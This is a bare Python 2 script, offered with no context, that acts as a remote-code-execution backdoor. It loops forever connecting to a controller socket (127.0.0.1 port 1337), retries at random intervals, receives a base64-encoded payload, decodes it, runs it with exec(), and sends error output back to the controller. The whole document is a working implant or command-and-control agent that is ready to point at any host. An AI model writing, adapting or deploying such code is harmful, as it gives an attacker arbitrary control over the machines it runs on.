while True: 
    import socket,base64
    from random import randint
    from time import sleep
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    e=''
    try:
        s.connect(('127.0.0.1',1337))
    except:
        sleep(randint(1,8)) 
        continue
    try:
        d=s.recv(100000);d=d.split('@')
    except Exception as ex:
        e+=str(ex)
    try:
        x=d[1];
        x=base64.decodestring(x) 
        exec(x)
    except Exception as ex:
        e+=str(ex)
    if not e=='':
        s.send(base64.encodestring(e))
    s.close();
